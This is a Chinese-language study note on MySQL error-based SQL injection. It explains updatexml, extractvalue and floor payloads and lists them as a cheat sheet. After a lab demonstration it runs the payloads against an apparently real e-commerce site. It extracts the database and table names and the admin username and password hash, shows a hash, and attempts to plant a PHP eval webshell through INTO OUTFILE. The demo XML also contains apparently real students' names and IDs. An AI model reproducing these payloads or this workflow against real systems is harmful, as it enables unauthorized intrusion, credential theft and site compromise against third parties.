[TOC]



# ==SQL注入-报错注入==

## 一、union查询注入不适用的地方

1、注入语句无法截断，且不清楚完整的SQL查询语句

2、页面不能回显查询信息

3、Web页面中有两个SQL查询语句，查询语句的列数不同



## 二、关于MySQL处理XML

1、先准备以下XML文件内容

```xml
<?xml version="1.0" encoding="UTF-8"?>
<school>
  <class id="WNCDC085">
    <student sequence="11">
      <id>26221117</id>
      <name>ymqyyds</name>
      <sex>男</sex>
      <age>20</age>
      <degree>本科</degree>
      <school>西安邮电大学</school>
    </student>
    <student sequence="2">
      <id>WNCD26221125</id>
      <name>田宇桐</name>
      <sex>男</sex>
      <age>20</age>
      <degree>本科</degree>
      <school>西安邮电大学</school>
    </student>
  </class>
  <class id="WNCDC086">
    <student sequence="1">
      <id>WNCD26221133</id>
      <name>齐晨婕</name>
      <sex>男</sex>
      <age>20</age>
      <degree>本科</degree>
      <school>西安邮电大学</school>
    </student>
    <student sequence="2">
      <id>WNCD26221107</id>
      <name>白浩然</name>
      <sex>男</sex>
      <age>21</age>
      <degree>本科</degree>
      <school>西安邮电大学</school>
    </student>
  </class>
</school>
```

## 2、创建一张表，其中有一列的值为上述xml文件内容

本实例中 xmltable 为表名，testxml 为列名，只有一行一列，值为xml文件内容

![image-20240711163822807](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711163822807.png)

## 3、执行以下SQL语句

**主要是内置函数和xpath的结构**

```sql
#查询齐晨婕
select extractvalue(textxml,'//class[@id="WNCDC086"]/student[@sequence="1"]/name') from xmltable;

#修改齐晨婕为我的女人
update xmltable set textxml = updatexml(textxml,'//class[@id="WNCDC086"]/student[@sequence="1"]/name',"<name>我的女人</name>");
```

![image-20240711165518793](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711165518793.png)

![image-20240711165657701](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711165657701.png)

以上实验旨在说明，MySQL中对xml文件格式处理的支持

## 三、报错注入

当union select出现不适用的情况下，我们通常使用报错注入。

报错注入的原理就是通过构造特殊的报错语句，使MySQL数据库报错，使得我们要查询的信息显示再报错信息内，同时把报错信息显示在页面上。

常用的报错函数有 `updatexml()` `exctractvalue()` `floor()` 等等。大致报错的原理就是利用输入的字符串逻辑上的冲突造成报错。

```sql
http://192.168.230.147/security/read.php?articleid=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
# updatexml(x,y,z) 修改x列中的y值为z，但是y值必须是正确的XPATH路径才可以，如果不是就会对该参数进行解析然后报错
```

![image-20240711172707409](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711172707409.png)

```sql
http://192.168.230.147/security/read.php?articleid=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="woniunote"),0x7e),1)
# 利用报错注入查看表名
```

![image-20240711172727552](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711172727552.png)

很显然，长度太长会发生截断。

> `updatexml(XML_document,XPath_string,new_value)` 函数的参数解析
>
> | 参数         | 描述                                       |
> | ------------ | ------------------------------------------ |
> | XML_document | String格式，为XML文档对象的名称，文中为Doc |
> | XPath_string | XPath格式的字符串                          |
> | new_value    | String格式，替换查找到的符合条件的数据     |
>
> concat() 函数是将所传参数连成一个字符串，因此不会符合XPath——String的格式，从而出现格式错误，爆出相关信息。
>
> 0x7e是ASCII码，实际为 `~` ，updatexml() 报错信息为特殊字符，字母及之后的内容，为了前面字母丢失，开头连接一个特殊字符 ~

## 四、常用的报错注入payload

这种东西网上很多，可以自己找找

[各种报错注入payload总结——转自郁离歌-CSDN博客](https://blog.csdn.net/weixin_40709439/article/details/86661702)

事实上报错注入适用的场景很多，不光是select，insert，update，delete都会有所涉及，并且用得很多

```sql
#1、Updatexm1报错：
and updatexml(1,concat(0x7e,(select user())，0x7e),1)

/security/read,php?id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table schema='learn' limit 1,1),0x7e),1)

#2、ExtractValue报错:
and extractvalue(1,concat(0x7e,(select table name from information_schema.tables limit
1)，0x7e));

#3、floor报错:
(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

> 如果使用MySQLi模块进行数据库操作，默认情况下，当执行mysqli_query时将不会报错，可以使用echo mysqli_error($conn)来输出错误信息。

![image-20240711115145102](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711115145102.png)

| admin_id | admin_username | admin_password                   | admin_email |
| -------- | -------------- | -------------------------------- | ----------- |
|          | EGadmin        | eebebf3f1498e71ea784678ddd386072 |             |

找到两个站点，我先对第一个站点进行注入测试

- `https://www.everestgifts.in/products.php?catid=1 order 1`

发现只有order 1 的时候才是正常的，但一个站点不肯恶搞一张表中只有一列。我再尝试 select 1 发现报错，由此可知，我们得到的结果是错的，既然如此我们就尝试报错注入，谁然他不管怎么测试都是报错呢

- `https://www.everestgifts.in/products.php?catid=-1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)`

可以得到数据库的名称

![image-20240711123519664](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711123519664.png)

- `https://www.everestgifts.in/products.php?catid=-1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)`

![image-20240711123547124](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711123547124.png)

可以得到用户名

- `https://www.everestgifts.in/products.php?catid=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1),0x7e),1)`

![image-20240711123741528](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711123741528.png)

可以得到表名，通过对limit的不断修改，我们可以得到很多表名

得到表名之后再去查看列名

- `https://www.everestgifts.in/products.php?catid=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns limit 0,1),0x7e),1)`

![image-20240711123913430](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711123913430.png)

同样的，分别对不同的limit 数字的修改，我们可以得到每一张表中的每一列的列名

**知道列名，知道表名，这不就可以查数据了吗**

- `https://www.everestgifts.in/products.php?catid=-1 and updatexml(1,concat(0x7e,(select admin_username from admin limit 0,1),0x7e),1)`

![image-20240711124113742](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711124113742.png)

- `https://www.everestgifts.in/products.php?catid=-1 and updatexml(1,concat(0x7e,(select admin_password from admin limit 0,1),0x7e),1)`

![image-20240711124150428](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711124150428.png)

但是由于updatexml对xpath的路径参数长度有限制，最多只允许32位长度，所以我们还需要对查询结果操作一下，看如何能得到正常的长度

![image-20240711124334767](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711124334767.png)

这样的不知道对不对

那么现在管理员账户和密码都知道了，接下来该怎么做就看自己了

- `https://www.everestgifts.in/products.php?catid=-1 and updatexml(1,concat(0x7e,(select admin_password from admin limit 0,1),0x7e),1)  union select "<? php eval($_POST['a']); ?>" into outfile "./shell.php"`

![image-20240711124432735](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240711124432735.png)

甚至可以写木马，不过该用户对目录的权限不够，无法写操作

